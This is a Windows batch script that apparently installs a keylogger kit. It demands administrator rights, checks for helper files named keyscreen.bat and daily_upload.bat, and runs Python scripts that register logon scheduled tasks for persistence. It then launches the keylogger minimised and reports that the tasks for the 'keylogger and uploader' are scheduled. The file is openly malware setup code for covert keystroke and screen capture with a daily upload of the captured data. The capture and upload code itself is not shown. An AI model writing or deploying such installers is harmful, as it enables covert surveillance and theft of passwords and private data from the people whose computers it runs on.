@echo off

:: Ensure we're running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Please run as administrator!
    pause
    exit /b
)

:: Get absolute path of the current directory
set current_dir=%~dp0

:: Check if keyscreen.bat exists using absolute path
IF NOT EXIST "%current_dir%keyscreen.bat" (
    echo Error: keyscreen.bat not found in "%current_dir%".
    pause
    exit /b
)

:: Check if daily_upload.bat exists using absolute path
IF NOT EXIST "%current_dir%daily_upload.bat" (
    echo Error: daily_upload.bat not found in "%current_dir%".
    pause
    exit /b
)

:: Run Python scripts to create logon tasks
pythonw "%current_dir%keys_logon_task.py"
pythonw "%current_dir%schedule_uploader_task.py"

start "" /min "%current_dir%keyscreen.bat"

echo Logon tasks for keylogger and uploader have been scheduled successfully.

pause
exit
